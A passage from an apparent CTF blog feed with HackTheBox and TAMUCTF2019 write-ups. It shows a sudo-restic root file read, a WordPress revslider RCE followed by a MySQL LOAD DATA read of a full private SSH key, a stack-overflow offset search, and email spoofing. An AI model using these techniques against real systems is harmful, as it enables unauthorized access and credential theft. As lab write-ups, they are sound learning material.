    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now be sure that www-data can run &lt;strong&gt;/usr/bin/restic backup -r rest&lt;/strong&gt; as root without a password.&lt;/p&gt;

&lt;h2 id=&quot;backup-and-dump-roottxt-file&quot;&gt;Backup and dump root.txt file&lt;/h2&gt;

&lt;p&gt;Now is the the part where I had to do a ton of research to understand this program. First I read the &lt;a href=&quot;https://restic.readthedocs.io/en/latest/&quot;&gt;documentation&lt;/a&gt; for restic.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-l&quot;&gt;Restic is a fast and secure backup program. 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That’s what the introduction tells us. Reading through the docs, I noticed two important thing:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We can user a rest server as a repository&lt;/li&gt;
  &lt;li&gt;We can dump the files that we backed up to standard output (stdout)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Which gave me the idea that I had an arbitrary read on the server&lt;/p&gt;

&lt;p&gt;I found this &lt;a href=&quot;https://github.com/restic/rest-server&quot;&gt;Github&lt;/a&gt; that has the binaries for running a rest server locally (Remember we can’t make outbounds connections). I transferred the file using over &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and started a server locally on the port 8000&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/dev/shm/server$ ../rest-server --path ${PWD}
Data directory: /dev/shm/server
Authentication disabled
Private repositories disabled
Starting server on :8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We need to create a repository on this server to stored the backup data.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/dev/shm/server$ restic init --repo rest:http://localhost:8000/
enter password for new repository: 
enter password again: 
created restic repository 417ad86527 at rest:http://localhost:8000/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that our repository is set, let’s send the root.txt file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:/dev/shm/ sudo /usr/bin/restic backup -r rest:http://localhost:8000/ -p pass_file /root/root.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;We need to pass the -p argument because we’re not in a full tty shell, so if the program asks for an input (stdin) we would just lose our shell. The pass_file contains the password we set when we created the repository&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now that our flag is in our repository we just need to dump it&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/dev/shm$ restic -r rest:http://localhost:8000/ snapshots
enter password for repository: 
password is correct
ID        Date                 Host        Tags        Directory
----------------------------------------------------------------------
e8ce5ed2  2020-04-04 04:53:01  bolt                    /root/root.txt
----------------------------------------------------------------------
1 snapshots
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/dev/shm$ restic dump -r rest:http://localhost:8000/ e8ce5ed2 root.txt
enter password for repository: 
password is correct
ntrkzgnkota&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hope you enjoyed it  :-)&lt;/p&gt;

&lt;p&gt;by me&lt;/p&gt;
</description>
        <pubDate>Sat, 04 Apr 2020 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/Registry-hackthebox-walkthrough/</link>
        <guid isPermaLink="true">http://localhost:4000/Registry-hackthebox-walkthrough/</guid>
        
        <category>HACKTHEBOX</category>
        
        <category>|</category>
        
        <category>DOCKER</category>
        
        <category>|</category>
        
        <category>BOLT</category>
        
        <category>|</category>
        
        <category>CMS</category>
        
        <category>|</category>
        
        <category>REGISTRY</category>
        
        <category>|</category>
        
        <category>HARD</category>
        
        
        <category>challenge</category>
        
      </item>
    
      <item>
        <title>My model</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: RATF &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 23 Mar 2020 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/my-first-post/</link>
        <guid isPermaLink="true">http://localhost:4000/my-first-post/</guid>
        
        <category>RATF</category>
        
        
        <category>challenge</category>
        
      </item>
    
      <item>
        <title>TAMUCTF2019 Wordpress Write-up</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: CTF | RATF | FLAG | CHALLENGE &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Hey guys! This post i’m my mindset on how I solved the Wordpress challenge from TAMUCTF2019&lt;/p&gt;

&lt;p&gt;This kind of challenge is very similar to those HackTheBox challenges, where you have to get RCE from a system and then escalate your privileges to root! Let’s GO.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/2/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As I said before our goal is to get the flag inside “/root/flag.txt” since it is inside the root folder we must become root to read it. (Most of the time)
We’re given an openvpn config file to connect to that docker network where the machine is running.&lt;/p&gt;

&lt;p&gt;Let’s start our enumaration with nmap.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;nmap -sV -sC 170.30.0.3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we get the following services.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;~/ctf/tamu/wordpress # nmap 172.30.0.3 -sV -sC                                                                                                                    root@kali
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 18:05 EST
Nmap scan report for 172.30.0.3
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 0d:1f:51:d6:f3:3e:07:f6:cc:0f:4f:88:12:de:e2:52 (DSA)
|   2048 75:cb:36:cf:54:fa:ed:48:99:93:d2:54:a3:b0:8e:8c (RSA)
|   256 f8:59:11:11:0f:74:31:39:55:40:2c:3a:f9:52:9c:45 (ECDSA)
|_  256 fe:af:37:4e:b6:78:d8:4f:ec:5b:71:a6:c3:64:c1:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: WordPress 5.1
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: TAMUctf &amp;amp;#8211; Just another WordPress site
MAC Address: 02:42:C7:86:A7:37 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.34 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Based on the nmap result, we got an ssh and HTTP Service. Cool, probably the WordPress site, so let’s focus on this.When we open the wordpress site, nothing calls our attention to explore so Iran WPScan against it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;wspcan --url http://172.30.0.3
[+] revslider
 | Location: http://172.30.0.3/wp-content/plugins/revslider/
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WordPress Slider Revolution Local File Disclosure
 |     Fixed in: 4.1.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7540
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579
 |      - https://www.exploit-db.com/exploits/34511/
 |      - https://www.exploit-db.com/exploits/36039/
 |      - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html
 |      - http://packetstormsecurity.com/files/129761/
 |
 | [!] Title: WordPress Slider Revolution Shell Upload
 |     Fixed in: 3.0.96
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7954
 |      - https://www.exploit-db.com/exploits/35385/
 |      - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute
 |
 | The version could not be determined.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This part cought my attention, apparently this wordpress is running “Slider Revolution” which seems to have a few exploits available. So I googled them a bit.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/2/alert.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I found this modulo on metasploit that leads to RCE directly, I ran it but no so confident It would work.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/2/code1.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But hey it did work and I got my reverse shell! Cool, part 1 finished.&lt;/p&gt;

&lt;p&gt;Next step is to figure out how we can escalate our privileges to root. Let’s enumerate.&lt;/p&gt;

&lt;p&gt;Without going very far I found an interesting file in /var/www called note.txt.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;Your ssh key was placed in /backup/id_rsa on the DB server.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hum? So the mysql database running for the wordpress, is not running in this server? Let’s find out where it is.&lt;/p&gt;

&lt;p&gt;By going through the Wordpress config files we must check wp-config.php.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MySQL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;You&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/** The name of the database for WordPress */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wordpress'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/** MySQL database username */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wordpress'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/** MySQL database password */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0NYa6PBH52y86C'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/** MySQL hostname */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'172.30.0.2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That’s interesting, we got DB_NAME, DB_USER, DB_PASSWORD and DB_HOST&lt;/p&gt;

&lt;p&gt;At this time the challenge is basically over. Let’s connect to the mysql server.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;~/ctf/tamu/wordpress # mysql -h 172.30.0.2 -u wordpress -p0NYa6PBH52y86C   
root@kali Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 65
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We got our connection, so we’re inside the 172.30.0.2 where the backup ssh key is stored at /backup/id_rsa all we have to do now is read this file with mysql.&lt;/p&gt;

&lt;p&gt;So i created a table foo inside Mysql database.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;MySQL [mysql]&amp;gt; create table foo(line blob);
Query OK, 0 rows affected (0.20 sec)

MySQL [mysql]&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Then I loaded the content of the ssh key file inside the table.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;MySQL [mysql]&amp;gt; LOAD DATA infile '/backup/id_rsa' INTO TABLE foo;
Query OK, 27 rows affected (0.20 sec)
Records: 27  Deleted: 0  Skipped: 0  Warnings: 0
MySQL [mysql]&amp;gt; select * from foo
    -&amp;gt; ;
+------------------------------------------------------------------+
| line                                                             |
+------------------------------------------------------------------+
| -----BEGIN RSA PRIVATE KEY-----                                  |
| MIIEpAIBAAKCAQEA3Z35DpTcnm4kFkkGp6iDXqvUNH+/+hSDOY6rXsa40WMr7rjc |
| tHh8TgOBFZ6Rj5VzU/jY8O0qHxiPVn7BCYKhqyp1V1l9/ZCPRSjRLYy62dVTiHUt |
| ZbiPiY9+biHIsQ/nZfwiHmwlb0sWDoyFvX3OL/3AFMcYpZ4ldHQuwszJF4DeTV33 |
| ruSBoXIiICQyNJBHTboVel+WXAfMNumYMVNrtrwpNoD7whv9Oa2afUejXMJL42Rw |
| 8Xhab59HIIL9fl68FqgggVI4X3d/fzqKKGyoN5JxBLmQTCiVxhxTMv9OS0MhdSg6 |
| Nh3+lf/wUuweUQXqmohvETntwwGs8jnJGCyeDwIDAQABAoIBAHGVRpG/n/cfMiWt |
| 1dhWGMaLwJ4Ln6QXoU39nj1cEltWvayDWLKyUdtWFnGzLJ1vloVCNEX+96iqWMSX |
| AG7UYfGtOCjFuDoePh/PFK6IwzdkC4UTsWnCFucFAWKGtCpzoUB24jG/ccxBqpNY |
| WC9PbD7SigDcLfisPjwaU+EJPkNpl93VBk1BCJRbvWF+Wl/si3wmMZ0YRoyIAF5L |
| oBsq935xH8kJcixSVYKjG3hMUZfiLoQB+p/IFsxDlfGLE+M1esTZ5GIRjj+t7vBN |
| l2JZTY893gjfQzUv2WrJXzMhJvWGzOCsRRc4gOSeS6GYiip8glqg8iWHpWdgF6i9 |
| oAQx5pkCgYEA7oTmvy0cXvhPjkEbrizCCqf6sXfZps5e6eminTTBGA8NW/Uq+SQv |
| 5JEYxvIL+qMH6cKkc8rBaNhgy3vnv+UgE1PUFI0UWFGKb+OpzzvY/zkmf03enxrl |
| SK+QXH4FS9f7leivZRVEWBq1kDVIqHZtybYGg0etOvHYX0GwqV2UTy0CgYEA7dv0 |
| bxz6CO9bhxxpXRrrykX2Z57J3JW2I3yVkCY+4Y6x106K11X+b1547kEZk40i2Ugc |
| iE6jcYIRiYNiSgb0Ph4uxZHFlvBr8JA2fGHYIAnGRcoc1Gzgz5omRvU9H8uy5ipO |
| LyZ2dnMgXRVOjuXoN4UZR2rgWmJVLD1q7eKnh6sCgYAnVOUUC2VNR9celx/wZdMN |
| nMubLi9G8Wr3WZ6GG+fnhrvmORSABvaa005pqApPp0irxHwH2BxypJO5mlIJ88eJ |
| SF6FkQoU0kVo0/rxgGX1GEB/56BZTj8W8FR23BUVf6UuADPEEHC3spfUEuVLWlQa |
| WhjS1yP6v1y1wIhYNWU6dQKBgQDbZ1zdcXkh7MgcpRR7kW2WM1rK0imZk29i5HSB |
| dwXhwWJCHGztnKEJ0bby7pHNDQ7sJhxLj14sQbIzikGLz0ZUVjsGeyQryrGGQUBB |
| E2/sfZeqoHhfad8lICfWpDgxsA/hR3y++VekgyWDNzgzj9bX/6oFuowgUzwFhtGv |
| hLbL6QKBgQCvcDMmWs2zXwmIo1+pIHUUSv2z3MWb0o1dzHQI/+FJEtyQPwL1nCwg |
| bJaC0KT45kw0IGVB2jhWf0KcMF37bpMpYJzdsktSAmHdjLKdcr6vw2MNpRapaNQe |
| On0QmLzbpFr9kjqorinKVkjk/WlTo9rKDSrLiUueEVYTxEMCi92giw==         |
| -----END RSA PRIVATE KEY-----                                    |
+------------------------------------------------------------------+
27 rows in set (0.20 sec)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I copied this private to my local computer and used to log via ssh.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/2/code2.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we got Root!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;gigem{w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;

&lt;p&gt;by me&lt;/p&gt;
</description>
        <pubDate>Fri, 03 May 2019 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/tamuctf2019-wordpress-write-up/</link>
        <guid isPermaLink="true">http://localhost:4000/tamuctf2019-wordpress-write-up/</guid>
        
        <category>CTF</category>
        
        <category>|</category>
        
        <category>RATF</category>
        
        <category>|</category>
        
        <category>FLAG</category>
        
        <category>|</category>
        
        <category>CHALLENGE</category>
        
        
        <category>challenge</category>
        
      </item>
    
      <item>
        <title>TAMUCTF2019 PWN3 Write-up</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: CTF | RATF | FLAG | CHALLENGE &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Hey Guys! This post i’ll be showing you how I managed to solve PWN3 challenge from TAMUCTF2019!
This was a standard stack execution where we had to insert our shellcode in the stack and point ou EIP there to execute it. Let’GO!&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/example.png&quot; alt=&quot;code example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s execute the binary locally to see what happens.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/code1.png&quot; alt=&quot;code example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After sending a lot of bytes we get a “seg fault” and that’s what we want. Using GDB let’s find out how many bytes we must send to control EIP.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;gdb-peda$ pattern_create 400
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y'

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x25416825 in ?? ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
EBX+0 found at offset: 294
EBP+0 found at offset: 298
EIP+0 found at offset: 302
Registers point to pattern buffer:
[EAX] --&amp;gt; offset 0 - size ~203
[ESP] --&amp;gt; offset 306 - size ~94&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Using pattern_search we discover that offset is 302 bytes long. Cool valuable information there, but where is our ESP? Since that value keeps changing when we connect via netcat ASLR is on, so it gets hard to know where to point to. So we need to discover what is the address that pops up when the program is executed.&lt;/p&gt;

&lt;p&gt;Running a few times in different environments I noticed that we can use this address to determine the exact position of our ESP, because that address + 0x132 = $ESP&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-mcd&quot; data-lang=&quot;mcd&quot;&gt;Starting program: /root/ctf/tamu/pwn3/pwn3 
Take this, you might need it on your journey 0xffffd01e!

gdb-peda$ x/5wx $esp
0xffffd150: 0x4d254137 0x41692541 0x25413825 0x6a25414e

So, by doing 0xffffd150 - 0xffffd01e = 0x132&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Cool! Now we have everything set, let’s create our exploit.&lt;/p&gt;

&lt;p&gt;Got my shellcode from shellstorm.com&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/code2.png&quot; alt=&quot;code example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;

&lt;p&gt;by me&lt;/p&gt;
</description>
        <pubDate>Fri, 03 May 2019 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/tamuctf2019-pwn3-write-up/</link>
        <guid isPermaLink="true">http://localhost:4000/tamuctf2019-pwn3-write-up/</guid>
        
        <category>CTF</category>
        
        <category>|</category>
        
        <category>RATF</category>
        
        <category>|</category>
        
        <category>FLAG</category>
        
        <category>|</category>
        
        <category>CHALLENGE</category>
        
        
        <category>challenge</category>
        
      </item>
    
      <item>
        <title>TAMUCTF2019 Onboarding Checklist Write-up</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: CTF | RATF | FLAG | CHALLENGE &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Hey guys, This is how I solved the Onboading Checklist Challenge from TamuCTF 2019.&lt;/p&gt;

&lt;p&gt;This kind of challenge you don’t see everyday so it was a lot of fun and really simple.&lt;/p&gt;

&lt;p&gt;Let’s GO!&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/3/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Challenge presents itself with this message. Apparently “importantperson” has allowed “someguy” to ask for new account request for the new employees and asked “someguy” to send an e-mail to tamuctf@gmail.com with the new employee’s e-mail address.
So, all we have to do is send a spoofed email to tamuctf@gmail pretending to “someguy” with our e-mail address.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/3/addr.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used this &lt;a href=&quot;http://www.sendanonymousemail.net/&quot;&gt;Website&lt;/a&gt; to do it.&lt;/p&gt;

&lt;p&gt;And a few hours later we get our response back.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/3/code1.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;

&lt;p&gt;by me&lt;/p&gt;
</description>
        <pubDate>Fri, 03 May 2019 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/tamuctf2019-onboarding-checklist-write-up/</link>
        <guid isPermaLink="true">http://localhost:4000/tamuctf2019-onboarding-checklist-write-up/</guid>
        
        <category>CTF</category>
        
        <category>|</category>
        
        <category>RATF</category>
        
        <category>|</category>
        
        <category>FLAG</category>
        
        <category>|</category>
        
        <category>CHALLENGE</category>
        
        
        <category>challenge</category>
        
      </item>
    
      <item>
        <title>TAMUCTF2019 Keygenme — Write-up</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: CTF | RATF | FLAG | CHALLENGE &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Hello everybody! This is how I solved one of the many reversing problems at TAMUCTF 2019.&lt;/p&gt;

&lt;p&gt;This one was Keygenme, a pretty standard kind of challenge but yet very fun to solve it.&lt;/p&gt;

&lt;p&gt;Let’s go!&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s start by running the binary that was given to us and see what it says.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code1.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Basically, when we run the binary it asks for a product key and if we give an incorrect one it simply shuts itself down. Then I searched for the strings inside the binary, sometimes they help us understand what the program is doing.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code2.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By using rabin2 I was able to identify all the strings in the binary, all of them are very important so let’s take a look at them one by one&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;	[OIonU2_&amp;lt;__nK&amp;lt;KsK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A pretty odd string that at the start don’t get our attention as the others, but it’s gonna be important in a moment.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;\nPlease Enter a product key to continue:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That’s the string we just saw.&lt;/p&gt;

